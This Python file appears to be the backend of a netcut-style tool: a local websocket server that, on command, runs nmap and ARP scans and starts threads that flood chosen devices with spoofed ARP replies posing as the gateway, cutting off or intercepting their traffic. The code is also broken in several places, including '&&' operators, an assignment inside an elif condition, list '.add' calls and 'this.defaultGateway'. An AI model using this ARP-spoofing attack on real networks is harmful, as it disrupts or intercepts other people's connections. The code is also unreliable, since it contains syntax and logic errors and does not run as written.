import asyncio, websockets, json, time
import netcututils as nc
import threading
from scapy.all import *
#Return an array with every IP of connected devices (on local network)
spoofed = []
defaultGateway = "192.168.0.254"

def doit(target_ip, gateway_ip):
    t = threading.currentThread()
    packet = nc.craft_arp_spoof(target_ip, gateway_ip)

    while getattr(t, "do_run", True):
        send(packet)
    time.sleep(1) #Optionnal

    # Reset the network back to its initial state (this is basically a correct ARP packet from a gateway to a target)
    send(ARP(op = 2, psrc = gateway_ip, hwsrc = getmacbyip(gateway_ip), pdst = target_ip, hwdst = getmacbyip(target_ip)))

async def echo(websocket, path):
    
    async for message in websocket:
        
        request = json.loads(message)
        if request[0] == "nmap_scan":
            await websocket.send(json.dumps(nc.nmap_scan()))
        elif request[0] == "arp_scan":
            await websocket.send(json.dumps(nc.arp_scan()))
        elif request[0] == "arp_spoof":
            if request.len() > 2 && spoofed.count(request[1]) < 1 :
                spoofed.add(request[1])
                t = threading.Thread(target=doit, args=(request[1], request[2]))
                t.start()
            elif request.len() = 2 && spoofed.count(request[1]) < 1 :
                spoofed.add(request[1])
                t = threading.Thread(target=doit, args=(request[1], defaultGateway))
                t.start()
        elif request[0] == "gateway":
            this.defaultGateway = request[1]    
        elif request[0] == "stop":
            t.do_run = False
            t.join()
        else:
            await websocket.send("this request doesn't exist")

        
        # print(f'1 , {request[0]} \n')
        # print(f'2 , {request[1]}')
       
        # await websocket.send(json.dumps(nmap_scan()))
        print("scan end")

asyncio.get_event_loop().run_until_complete(
    websockets.serve(echo, 'localhost', 8765))
asyncio.get_event_loop().run_forever()





